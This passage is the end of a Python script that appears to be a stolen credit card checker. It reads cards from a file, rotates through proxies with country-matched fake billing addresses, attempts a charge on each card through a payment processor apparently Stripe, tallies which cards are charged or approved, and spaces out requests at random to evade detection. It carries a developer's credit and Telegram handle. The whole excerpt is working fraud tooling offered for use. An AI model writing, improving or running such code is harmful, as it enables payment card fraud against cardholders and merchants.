            return "DECLINED", "3DS Required", RED

        msg = _format_stripe_error(purchase_result)
        code = _extract_decline_code(purchase_result).lower()
        if code in APPROVED_DECLINE_CODES:
            return "APPROVED", msg, YELLOW
        return "DECLINED", msg, RED

    return "ERROR", "No proxies left", RED


def main() -> int:
    print_banner()

    proxy_entries = load_proxy_entries()
    if not proxy_entries:
        print(f"{RED}[!] No proxies in {PROXY_FILE.name} — {CREDIT}{RESET}", file=sys.stderr)
        return 1

    cards = load_cards()
    if not cards:
        print(f"{RED}[!] No cards in {CC_FILE.name} — {CREDIT}{RESET}", file=sys.stderr)
        return 1

    print(f"{DIM}[{DEV_TG}] Proxies: {len(proxy_entries)} | Cards: {len(cards)} | Random proxy per request{RESET}")

    try:
        client, account = _ensure_login(proxy_entries)
    except Exception as exc:
        print(f"{RED}[!] Login failed: {exc} | {CREDIT}{RESET}", file=sys.stderr)
        return 1

    billing_name = client.account_name or _account_name(account)
    print(f"{DIM}[{DEV_TG}] Account: {account.get('email_address') or client.email}{RESET}")

    print(f"\n{CYAN}{'─' * 56}{RESET}")
    print(f"{CYAN}  card | status | response     ({CREDIT}){RESET}")
    print(f"{CYAN}{'─' * 56}{RESET}")

    charged = approved = declined = 0

    for card_line, card in cards:
        if not client.proxy_pool or not len(client.proxy_pool):
            print_card_result(card_line, "ERROR", "No proxies left", RED)
            break

        card_proxy = client.proxy_pool.pick()
        card_country = proxy_country(card_proxy.url) if card_proxy else "US"
        address = address_for_country(card_country)

        status, message, color = _try_charge_card(
            client,
            card=card,
            address=address,
            billing_name=billing_name,
        )
        print_card_result(card_line, status, message, color)

        if status == "CHARGED":
            charged += 1
            client.save_session()
        elif status == "APPROVED":
            approved += 1
        elif status == "DECLINED":
            declined += 1

        time.sleep(random.uniform(0.5, 1.5))

    print(f"\n{CYAN}{'─' * 56}{RESET}")
    print(f"{CYAN}  Done — CHARGED: {charged} | APPROVED: {approved} | DECLINED: {declined}{RESET}")
    print(f"{CYAN}  {CREDIT} | Developer: {DEV_TG}{RESET}")
    print(f"{CYAN}{'─' * 56}{RESET}")

    client.save_session()
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
